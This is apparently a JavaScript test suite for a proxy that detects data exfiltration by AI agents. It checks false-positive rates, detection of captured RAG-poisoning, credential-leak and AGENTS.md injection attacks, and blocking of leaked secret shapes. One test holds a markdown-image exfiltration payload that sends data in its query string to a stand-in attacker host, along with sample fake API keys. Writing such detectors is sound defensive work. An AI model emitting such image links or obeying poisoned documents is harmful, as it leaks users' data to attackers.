// Egress heuristics + the benign corpus (FP rate is a headline metric).
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { createDetector, DVAA_HONEYTOKENS } from '../index.js';
import { liveCaptures, t1Benign, dvaaDetector, dvaaInProcess, response, toolCall, quietLogger } from './helpers.js';

test('benign corpus: all T1 benign captures + all live benign captures -> allow, zero findings', () => {
  const cases = [...t1Benign(), ...liveCaptures().filter((c) => c.expected === 'benign')];
  assert.ok(cases.length >= 11, `${cases.length}`);
  for (const c of cases) {
    const { det } = dvaaDetector({ agent: { name: c.agent ?? c.id, port: c.port } });
    const d = det.inspect({ sessionId: `benign-${c.id}`, request: c.request, response: c.response });
    assert.equal(d.action, 'allow', c.id);
    assert.deepEqual(d.findings, [], c.id);
  }
});

test('all live DVAA attack captures are DETECTED; the honest prevention point per scenario is labeled', () => {
  // in-process DVAA: where can the proxy actually stop it?
  const expected = {
    'ragbot-7005-rag-poisoned': 'request', // poisoned doc travels in the request -> pre-forward block
    'ragbot-aim-7014-rag-poisoned': 'request',
    'legacybot-7003-cred-leak': 'response', // leak is in the reply content -> withholding the reply prevents disclosure
    'repobot-7022-agents-md': 'none', // AGENTS.md read in-process: detect + evidence only (AIM twin is the preventive control)
    'repobot-aim-7023-agents-md': 'none',
  };
  for (const c of liveCaptures().filter((x) => x.expected === 'malicious')) {
    const { det } = dvaaInProcess({ agent: { name: c.agent, port: c.port } });
    const pre = det.inspect({ sessionId: `${c.id}-pre`, request: c.request });
    const post = det.inspect({ sessionId: `${c.id}-post`, request: c.request, response: c.response });
    assert.ok(post.findings.length > 0, `${c.id} detected`);
    const point = pre.action === 'block' ? 'request' : post.findings.some((f) => f.direction === 'response' && f.prevents) ? 'response' : 'none';
    assert.equal(point, expected[c.id], c.id);
  }
});

test('markdown image exfil (EchoLeak pattern) in the reply -> egress.markdown_image_exfil BLOCK', () => {
  const content = 'Here is your summary.\n\n![status](https://img.attacker.test/p.png?d=Q3%20revenue%2042M)\n';
  const d = createDetector({ toolExecution: 'client', logger: quietLogger() }).inspect({ sessionId: 'md', request: { messages: [{ role: 'user', content: 'summarize' }] }, response: response([], content) });
  const f = d.findings.find((x) => x.ruleId === 'egress.markdown_image_exfil');
  assert.equal(f.category, 'egress_markdown_image');
  assert.equal(f.entities.sink.type, 'markdown_image');
  assert.equal(d.action, 'block');
  // allowlisted image host, or a plain link, is fine
  const ok = createDetector({ toolExecution: 'client', logger: quietLogger(), policy: { allowlist: { hosts: ['cdn.example.test'] } } }).inspect({ sessionId: 'md2', request: { messages: [{ role: 'user', content: 'x' }] }, response: response([], '![logo](https://cdn.example.test/logo.png?v=2) see [docs](https://docs.test/a?b=c)') });
  assert.equal(ok.action, 'allow');
});

test('secret shapes in egress args (no honeytoken registered): strong kinds block, PII alone alerts unless tainted', () => {
  const pol = { allowlist: { hosts: ['api.example.test'] } };
  const send = (body, sessionId) => createDetector({ toolExecution: 'client', policy: pol, logger: quietLogger() }).inspect({ sessionId, request: { messages: [{ role: 'user', content: 'sync' }] }, response: response([toolCall('c', 'http_post', { url: 'https://api.example.test/x', body })]) });
  const jwt = 'eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U';
  for (const [k, body] of Object.entries({
    aws: 'AKIAIOSFODNN7EXAMPLE',
    openai: 'sk-proj-abcdefghijklmnopqrstuvwxyz0123456789',
    pem: '-----BEGIN RSA PRIVATE KEY-----\nMIIB...\n-----END RSA PRIVATE KEY-----',
    jwt,
    github: `ghp_${'a1B2c3D4e5'.repeat(4)}`,
  })) {
    const d = send(body, k);
    const f = d.findings.find((x) => x.ruleId === 'egress.secret_pattern');
    assert.ok(f, k);
    assert.equal(f.disposition, 'block', k);
  }
  const pii = send('ssn 219-09-9999 card 4111 1111 1111 1111', 'pii');
  const f = pii.findings.find((x) => x.ruleId === 'egress.pii_pattern');
  assert.equal(f.disposition, 'allow');
  assert.match(f.evidence, /ssn, card_number/);
  const prose = send('The quarterly report covers revenue growth across all regions and products.', 'prose');
  assert.deepEqual(prose.findings, []);
});

test('every finding carries the T4 verdict fields and T3 extras', () => {
  const c = liveCaptures().find((x) => x.id === 'repobot-7022-agents-md');
  const d = createDetector({ toolExecution: 'client', honeytokens: DVAA_HONEYTOKENS, logger: quietLogger(), agent: { name: 'RepoBot', id: 'repobot', port: 7022 } }).inspect({ sessionId: 's', request: c.request, response: c.response });
  for (const f of d.findings) {
    for (const k of ['category', 'ruleId', 'disposition', 'detectionLatencyMs', 'timestamp', 'entities', 'evidence', 'caseCard', 'layers', 'reason', 'enforcement', 'wouldBlock', 'mode']) assert.ok(k in f, k);
    assert.equal(f.entities.agent.port, 7022);
    assert.ok(f.detectionLatencyMs > 0);
    assert.ok(['block', 'allow', 'report'].includes(f.disposition));
  }
});
